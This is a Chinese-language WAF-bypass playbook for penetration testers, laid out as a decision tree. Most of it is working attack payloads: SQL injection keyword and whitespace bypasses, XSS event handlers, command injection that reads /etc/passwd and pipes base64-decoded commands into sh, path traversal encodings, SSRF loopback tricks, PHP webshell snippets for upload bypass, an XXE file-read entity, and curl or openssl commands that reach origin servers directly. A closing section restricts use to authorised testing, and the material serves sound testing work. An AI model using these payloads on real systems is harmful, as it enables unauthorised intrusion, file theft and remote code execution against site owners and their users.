# WAF 绕过（通用决策树）

> payload 被 WAF / 过滤器 / 业务校验拦截后的「继续打」路由手册——不是单一漏洞类，而是编码 / 分块 / 参数污染 / 等价替换的绕过决策树。绕过本质 = 解析差异 + 边界 corner case + 防护盲区。

**取材来源**：[MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（综合 bypass_strategies + 各 WooYun playbook 绕过章节）、[SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)（SnailSploit offensive-checklist 改写）；权威公开源 PayloadsAllTheThings / PortSwigger / OWASP。

---

## 1. 触发信号

- 同一 payload 普通参数能过、带恶意语义就 403/406/418/自定义拦截页 → 是 WAF 拦
- 响应头出现 `Server` / `X-WAF` / 错误页特征 / 状态码异常；普通字符串正常、仅恶意 payload 触发 → WAF 拦截 [本地 src-hunter]
- 前端指纹：Cloudflare（`__cf_bm` / `cf_clearance` / `cf_chl_*` cookie、`/cdn-cgi/` 路由）、Incapsula（`X-CDN: Incapsula`）、AWS WAF（`AWSALB`/`AWSALBCORS` cookie）、Sucuri（`X-Sucuri-ID`）、ModSecurity、阿里云盾、长亭雷池 [Claude-Red / 本地 src-hunter]
- 应用层拦（非 WAF）：输入过滤/输出编码导致 payload 被改写而非被拦

## 2. 高频入口点（绕过维度）

**决策树** [本地 src-hunter]：

```
Payload 被拦
 ├─ 看返回是谁拦的
 │   ├─ WAF 拦 → 协议层绕过（HPP / Chunked / 大小写 / Content-Type）
 │   └─ 应用拦 → 编码层 / 语义层（双写、注释、等价函数）
 ├─ 看黑名单还是白名单
 │   ├─ 黑名单 → 找漏掉的关键字 / 同义词
 │   └─ 白名单 → 找白名单允许的危险用法
 └─ 看输入过滤还是输出编码
     ├─ 输入过滤 → 多重编码 / 二次注入
     └─ 输出编码 → 上下文逃逸（HTML→JS、URL→JS）
```

绕过维度 [Claude-Red / 本地 src-hunter]：编码（URL/双编码/Unicode/HTML 实体/宽字节）、协议（HPP/Chunked/方法覆盖/Content-Type 混淆/H2 降级）、语义（大小写/注释/等价函数/拼接）、长度拆分（超长参数/多参数/二次注入）、入口切换（Header/Cookie/JSON/multipart）。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **确认谁拦的**：看响应头/错误页/状态码；同参数发普通字符串对照，只恶意 payload 触发即 WAF [本地 src-hunter]。
2. **识别 WAF**：`wafw00f https://target`；看指纹（cf-ray / ModSecurity / AWS / 阿里云盾 / 长亭）[本地 src-hunter]。
3. **选第一道绕过（最便宜优先）**：编码层（URL 双编码 → Unicode → 实体）→ 语义层（等价函数/注释/大小写）→ 协议层（HPP/Chunked/改 method/改 Content-Type）[本地 src-hunter]。
4. **第一道失败**：拆 payload（多参数组合/超长前缀填充/Cookie 走私）→ 切入口（Header → Cookie → JSON body → multipart）[本地 src-hunter]。
5. **还失败**：二次注入（先存 DB 再触发）→ 切目标（多租户换域名/子域）→ 记录「防护有效」转下一个端点 [本地 src-hunter]。

## 4. Payload 区（每条标注出处）

### 4.1 编码层 `[本地 src-hunter / Claude-Red]`

| 手法 | 示例 |
|---|---|
| URL 编码 | `UNION` → `%55%4E%49%4F%4E` |
| 双编码 | `/` → `%2f` → `%252f` |
| 16 进制 | `SELECT` → `0x53454C454354` |
| Unicode 变体 | `%u0027`、`a`（`alert` → `alert`）|
| HTML 实体 | `&#60;script&#62;`、`&#x3c;script&#x3e;` |
| 宽字节（GBK） | `%df%27`（把 `'` 变成汉字字节序列吃掉反斜杠）|
| 多重套娃 | URL → HTML 实体 → Unicode 三重编码 |

### 4.2 协议层（分块 / 参数污染 / 方法覆盖）`[本地 src-hunter / Claude-Red]`

```http
# HPP：前/后端取参数不同 [本地 src-hunter]
?id=1&id=2' OR 1=1--

# Chunked：让 WAF 看不到完整 body [本地 src-hunter]
Transfer-Encoding: chunked

# Content-Type 混淆：multipart 边界混淆 / 改 application/xml 让 WAF 不解析 [本地 src-hunter]
# 方法覆盖 [本地 src-hunter]
X-HTTP-Method-Override: PUT
_method=DELETE

# 大小写 Header [本地 src-hunter]
cONTENT-tYPE: application/x-www-form-urlencoded

# 多个 Content-Encoding 头（冲突值）[Claude-Red]
Content-Encoding: invalid
Content-Encoding: gzip
```

### 4.3 语义层（等价替换）`[本地 src-hunter / Claude-Red]`

**SQLi 关键字/空格/引号绕过** [本地 src-hunter]：

| 维度 | 手法 |
|---|---|
| 关键字 | `UnIoN SeLeCt` 大小写 / `UNunionION SELselectECT` 双写 / `un/**/ion sel/**/ect` 注释插入 / `/*!50000union*//*!50000select*/`（MySQL 内联注释）|
| 同义词 | `\|\|` 代 `OR`、`&&` 代 `AND` |
| 等号 | `LIKE` / `REGEXP` / `IN(1)` / `BETWEEN` |
| 函数 | `mid()`/`substr()`/`substring()`/`left()` 互换 |
| 空格 | `/**/` `%09` `%0a` `%0d` `%0b` `%0c`、括号嵌套 `select(user)from(dual)`、反引号 |
| 引号 | `0x61646D696E`（hex）、`char(97,100,109,105,110)`、`%df%27` |
| 数字 | `1` → `1-0` / `1+0` / `CHAR(49)` |
| 延时 | `id=(select(2)from(select(sleep(8)))v)`（WooYun-2015-0114228）双层延时绕 sleep 关键字 |

**XSS 上下文逃逸 / 事件库 / 标签替代** [本地 src-hunter / Claude-Red]：

```html
<svg/onload=alert(1)>              <!-- 标签替代 -->
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
" autofocus onfocus=alert(1) "     <!-- 引号闭合出属性 -->
';alert(1);//                       <!-- JS 字符串逃逸 -->
<svg onload=setTimeout('al'+'ert(1)')>   <!-- 拼接绕黑名单 -->
eval(atob('YWxlcnQoMSk='))          <!-- base64 -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">   <!-- mXSS -->
```

**命令注入空格/关键字绕过** [本地 src-hunter]：

```
${IFS}        cat${IFS}/etc/passwd
%09(Tab)      cat%09/etc/passwd
c'a't  c"a"t  c\at              # 引号/反斜杠分割
a=ca;b=t;$a$b /etc/passwd       # 变量拼接
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
```

### 4.4 长度 / 拆分 / 入口切换 `[本地 src-hunter / Claude-Red]`

- 超长参数（超过 WAF 检测窗口，常见 8KB/16KB，8k bypass）
- 多参数组合：`part1=SEL part2=ECT`
- 二次注入：先存进 DB，再触发
- 冷门入口：Cookie / Referer / X-Forwarded-For / User-Agent
- JSON 内嵌注入（CVE-2023-50969）：`{"id": {"$gt": "' OR 1=1--"}}`，多数 WAF 不解析 JSON 语法内 SQL [Claude-Red]

### 4.5 网络 / TLS / 指纹层 `[Claude-Red]`

```bash
# 直连源站绕过 WAF 层：Shodan/CloudFlair 找源站 IP，伪造 Host
curl -H "Host: target.com" https://<origin-ip>/

# Host 头欺骗：SNI 与 Host 不一致（仅看 Host 的 WAF 可绕）
curl -H "Host: legit.example.net" https://evil.example.com

# SNI 欺骗（openssl）
openssl s_client -connect 198.51.100.23:443 -servername allowed.example.com

# 省略 SNI（RFC 6066 可选）
curl --insecure -v -H "Host: target.host" https://<ip>/index.html
```

伪造来源 Header（绕过 IP 限制）[Claude-Red]：`X-Forwarded-For: 127.0.0.1` / `X-Client-IP` / `X-Real-IP` / `Client-IP` / `Forwarded: for=127.0.0.1`（前提：后端信任这些头）。

### 4.6 路径遍历 / SSRF / 文件上传绕过 `[本地 src-hunter]`

**路径遍历编码梯度**：

```
../        →  %2e%2e%2f
../        →  %252e%252e%252f      （双重 URL）
../        →  ..%c0%af / ..%c1%9c   （超长 UTF-8，旧 Tomcat/GlassFish）
../        →  %u002e%u002e%u2215    （IIS/旧版 Java）
../        →  ....// / ..../        （过滤器删一次后剩原型）
%00        →  ../../../etc/passwd%00.jpg   （PHP<5.3.4/旧 Java 截断）
;          →  /admin;.jpg            （IIS/Tomcat）
```

**SSRF 绕过（IP 表示法 / 域名 / 协议）**：

```
http://2130706433            # 十进制 127.0.0.1
http://0177.0.0.1            # 八进制
http://0x7f.0x0.0x0.0x1      # 16 进制
http://127.1                 # 简写
http://[::1]                 # IPv6
http://127.0.0.1.nip.io      # 公共解析回环
http://attacker.com#@127.0.0.1   # 域名+@ 绕过
```

**文件上传绕过表**：

| 检测层 | 绕过 |
|---|---|
| 客户端 JS | 禁用 JS / Burp 拦响应 |
| 扩展名黑名单 | `.Php` `.pHp` `.php3/.php5/.phtml/.phar` `.PHP%20` `.php.` |
| 扩展名白名单 | `%00` 截断（旧版）、`shell.jpg/.php`（Nginx fix_pathinfo）、`shell.asp;.jpg`（IIS6）、`.jspx` |
| Content-Type | 改 `image/jpeg`、`image/gif` |
| 文件头 | 加 `GIF89a\n<?php ...?>` 或 `\x89PNG...` |
| 内容静态特征 | `$a='ass'.'ert'; $a($_POST['x']);`、`array_map('assert',$_POST)` |
| 二次渲染 | payload 放进 EXIF/IDAT 块，渲染后仍可读 |

### 4.7 Corner Case 速查清单 `[本地 src-hunter]`

每发新 payload 前过一遍：双重 URL 编码（`%252e`）、Unicode 变体（`%u0027`）、宽字节（`%df%27`）、Overlong UTF-8（`%c0%ae`=`.`）、混合编码（部分编码+部分明文）、注释嵌套（`/*!50000select*/`）、科学计数法/浮点（`1e0union`、`1.0union`）、负数/0（`-1 UNION`、`0 OR`）、制表/换页（`\t \v \f \r`）、HPP（重复参数）、Chunked/Content-Encoding gzip、重复 Header（重复 Host/CL）、路径规范化差异（`//` `/./` `/;param` 尾斜杠）、JSON 重复 key（取首/取末）、XML DTD（`<!ENTITY xxe SYSTEM "file:///etc/passwd">`）。

### 4.8 针对 ML-WAF / GraphQL `[Claude-Red]`

```bash
# 语义绕过 + 噪声 token（对抗 n-gram/embedding 模型）[Claude-Red]
<svg/onload=self[atob('YWxlcnQ='):](1)>
<script>/*benign benign benign benign benign*/alert(1)</script>

# 低权重特征位放 payload（multipart filename 常不被重点加权）[Claude-Red]
Content-Disposition: form-data; name="file"; filename="<script>alert(1)</script>"

# GraphQL：深度别名压过 depth 限制、批量 query 打包、query name 掩码 [Claude-Red]
```

## 5. 工具用法

```bash
# WAF 指纹 [本地 src-hunter / Claude-Red]
wafw00f https://target
# 后端指纹看响应 Server 头
curl -sI https://target/ | grep -i "server:"

# SQLi WAF 绕过：sqlmap tamper 链
sqlmap -u "..." --tamper=between,space2comment,charencode
# 或按 WAF 选：--tamper=apostrophemask,base64encode,charencode,space2comment
```

工具速查 [Claude-Red]：WAFW00F（指纹）、IdentYwaf（盲指纹）、GoTestWAF / Lightbulb / FTW（测试 WAF 规则）、WAFNinja / WAFTester（模糊找绕过）、abuse-ssl-bypass-waf（找可用 TLS 套件）、enumXFF（枚举 X-Forwarded-For 绕过 IP 限制）、noble-tls / uTLS / tls-client（伪造浏览器级 TLS 指纹）。

## 6. 证据要求

**「已绕过」必须满足**：同一 payload 在直连/WAF 前被拦（记录拦截页 + 状态码 + 响应头），绕过变体返回目标业务响应（200/预期数据）——两条原始请求/响应并列保存。

**保存物**：拦截前后 HTTP 包截图、WAF 指纹证据（响应头/cookie）、绕过 payload 与最终生效响应。若走源站直连，附 Shodan/历史 DNS 记录来源 + `Host` 头伪造请求。

**CVSS 参考**：WAF 绕过本身不定级，取决于「绕过后的漏洞」——按被绕过 WAF 所保护漏洞的真实定级（如绕过后的 SQLi/RCE 按原漏洞 CVSS 计算）。

## 7. 合规边界 / 不要做的事

- **禁**：对生产 WAF 做高并发绕过爆破（易触发封禁/告警，视同 DoS）。逐条低速验证。
- **禁**：绕过后的 payload 执行破坏性动作——绕过的目标是「证明防护可被绕过」，不是实际 exploit。
- **禁**：用源站直连做超出授权范围的探测；源站 IP 属于基础架构，仅限授权目标使用。
- **限**：伪造 `X-Forwarded-For` 等头只用于验证 IP 校验缺陷，不用于攻击他人会话。
- **脱敏**：报告里的绕过 PoC 只给「证明点」，不附完整攻击链脚本（避免被直接复用于未授权目标）。
